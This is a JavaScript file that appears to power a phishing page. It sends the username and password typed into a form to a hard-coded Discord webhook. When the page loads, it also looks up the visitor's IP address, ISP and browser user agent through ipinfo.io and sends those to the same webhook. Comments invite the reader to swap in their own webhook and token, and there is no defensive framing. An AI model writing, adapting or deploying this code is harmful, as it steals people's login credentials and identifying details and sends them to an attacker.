async function sendData() {
    const user = document.getElementById("user").value;
    const pass = document.getElementById("pass").value;
    
    if (!user || !pass) {
        console.log("User or password is empty.");
        return;
    }
    
    const webhookURL = "https://discord.com/api/webhooks/1304152509845340251/74tE2N2FhHXsk6MB9EbzjHly-5ef9VQFX_qqdvppo9j3SotzWgaNS05ZY2tSJ8WIgso0"; // Replace with your Discord webhook URL

    // Send User and Password when the function is triggered by button click
    const payload = {
        content: `**[+] Username:** ${user}\n**[+] Password:** ${pass}`
    };

    const response = await fetch(webhookURL, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify(payload)
    });

    if (response.ok) {
        console.log("Data sent successfully!");
    } else {
        console.error("Failed to send data:", response.status, response.statusText);
    }
}

// This function will send the IP, ISP, and User-Agent as soon as the page loads
async function sendInfoOnLoad() {
    const webhookURL = "https://discord.com/api/webhooks/1304152509845340251/74tE2N2FhHXsk6MB9EbzjHly-5ef9VQFX_qqdvppo9j3SotzWgaNS05ZY2tSJ8WIgso0"; // Replace with your Discord webhook URL

    try {
        // Fetch IP and ISP info using an external API
        const ipResponse = await fetch("https://ipinfo.io/json?token=b0138b9c06beb1"); // Replace with your ipinfo token
        const ipData = await ipResponse.json();
        const ipAddress = ipData.ip || "[-] Unknown IP";
        const isp = ipData.org || "[-] Unknown ISP";

        // Get User-Agent from the browser
        const userAgent = navigator.userAgent;

        // Construct payload with styled content
        const payload = {
            content: `**[+] IP Address:** ${ipAddress}\n**[+] ISP:** ${isp}\n**[+] User Agent:** ${userAgent}`
        };

        const response = await fetch(webhookURL, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(payload)
        });

        if (response.ok) {
            console.log("Info sent successfully!");
        } else {
            console.error("Failed to send info:", response.status, response.statusText);
        }
    } catch (error) {
        console.error("Error:", error);
    }
}
window.onload = sendInfoOnLoad;
